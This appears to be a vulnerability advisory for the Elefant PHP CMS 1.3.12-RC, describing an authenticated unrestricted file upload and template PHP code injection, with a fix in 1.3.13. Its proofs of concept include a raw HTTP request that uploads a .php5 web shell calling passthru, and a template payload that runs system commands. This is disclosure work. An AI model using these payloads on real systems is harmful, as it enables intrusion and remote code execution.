2. Overview

Elefant is a content managment system written in PHP. In version 1.3.12-RC, it
is vulnerable to code execution because of two different vulnerabilities. It
allows the upload of files with dangerous type, as well as PHP code injection.

An account is required to exploit these issues.

3. Details

Upload of file with dangerous type

CVSS: High 9.0 AV:N/AC:L/Au:S/C:C/I:C/A:C

The file upload forbids the uploading of files with the .php extension, but
allows uploading of files with a number of other dangerous extensions leading
to code execution and XSS.

A user account is required which has the right to upload and manage files. By
default, the editor or admin role have this right.

Proof of Concept:

POST /filemanager/upload/drop HTTP/1.1 Host: localhost Accept-Language:
en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/
form-data; boundary=------multipartformboundary1472116478634 X-Requested-With:
XMLHttpRequest Content-Length: 316 Cookie: PHPSESSID=
57uejmot41c4jsbtbac85mek55; elefant_update_checked=1; elefant_last_page=
%2Fuser; elefant_user=nj86h42vi2j73tsturvq4slr05 Connection: close
--------multipartformboundary1472116478634 Content-Disposition: form-data; name
="path" --------multipartformboundary1472116478634 Content-Disposition:
form-data; name="file"; filename="test.php5" Content-Type: application/x-php <?
php passthru($_GET['x']); --------multipartformboundary1472116478634--

PHP Code Injection

CVSS: High 9.0 AV:N/AC:L/Au:S/C:C/I:C/A:C

The layout editor provides the option to create HTML templates. Additionally,
it allows to use a small subset of PHP constructs, namely: {{ var }} {% foreach
%} {% if %} {! handler !} {" text "}.

However, an attacker can use this functionality to execute arbitrary commands
via a template.

An account with the right to edit themes is required. By default, the admin
role has this right.

Proof of Concept:

Visit http://localhost/designer/add/layout Enter {{passthru('id')}} In the
textarea.

4. Solution

To mitigate this issue please upgrade at least to version 1.3.13.

Please note that a newer version might already be available.
